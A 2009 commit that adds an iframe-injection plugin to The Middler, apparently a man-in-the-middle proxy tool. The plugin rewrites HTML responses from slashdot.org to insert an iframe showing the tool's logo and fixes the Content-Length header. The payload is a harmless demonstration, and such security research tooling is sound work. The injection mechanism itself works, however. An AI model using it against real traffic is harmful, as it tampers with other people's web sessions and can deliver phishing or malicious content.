34e3b58d213366be4577c43f66739c445155bf57
jay.beale <jay.beale@fd9c7e10-fa1b-11dd-b507-8b4ecd5210be>
2009-07-15 17:10:20 +0000

    Fixed IFRAME injection.  It now adds a Middler logo iframe to the beginning of the page named in its variable.
    Moving the Metasploit functionality into its own module.

---
+++ libmiddler/plugins/plugin_iframe_injection.py
@@ -0,0 +1,66 @@
+#!/usr/bin/python
+import urllib2
+import re
+import libmiddler.api.header as header
+import libmiddler as ml
+#import libmiddler.api.register_http_plugin as register_http_plugin
+
+### FUNCTION TO MANIPULATE CLIENT REQUEST
+def doRequest(session, request_header, data):
+  changed = 0
+  stop = 0
+  return(request_header, data, changed, stop)
+
+### FUNCTION TO MANIPULATE SERVER RESPONSE
+def doResponse(session, request_header, response_header, data):
+  changed = 0
+  stop = 0
+  i = 1
+
+  # Check to see if we've got the right target site
+
+  target = "slashdot.org"
+  request_match = (("Host",target),)
+
+  # Set up the IFRAME to inject into the HTML
+
+  # TODO: Set the traffic capture code that gets my IP address to log it into
+  #       some kind of global or class variable.
+
+  inserted_url = "http://www.inguardians.com/tools/logo-themiddler-150px.jpg"
+
+  iframe = '''<iframe height=103 width=150 src="%s"></iframe>''' % (inserted_url)
+
+  if header.headertest(request_header,request_match):
+
+      # We could make sure only to do this if the browser was getting a web page.
+      response_match = (("Content-type","TEXT/HTML"),)
+      if header.headertest( response_header,response_match ):
+
+          # Check the response code line.
+          response_code_line = response_header[0][1]
+          (protover,response_code,reason) = response_code_line.split(" ")
+
+          ml.jjlog.debug("Response code line had these elements --%s-- --%s-- --%s\n" % (protover,response_code,reason) )
+
+          # Make sure we are only doing this on a 200 message.
+          # There's no point to injecting into a 30x redirect!
+          if response_code != "200":
+              return(response_header, data, changed, stop)
+
+          ml.jjlog.debug("Preparing to inject iframe into request for %s" % target)
+
+          ### MANIPULATE DATA - INSERT SCRIPT
+          data = re.sub(r'\<body\>', r'<body>' + iframe, data)
+          changed = 1
+
+          ### Correct the content-length.
+          header.headerfix(response_header, "Content-Length", str(len(data)) + '\r\n')
+
+          # We have changed the header and we don't want any other plugins to touch it.
+          # TODO: Decide on how to do priority/dependencies/ordering so redirects go first.
+
+          changed = 1
+          stop = 1
+
+  return(response_header, data, changed, stop)
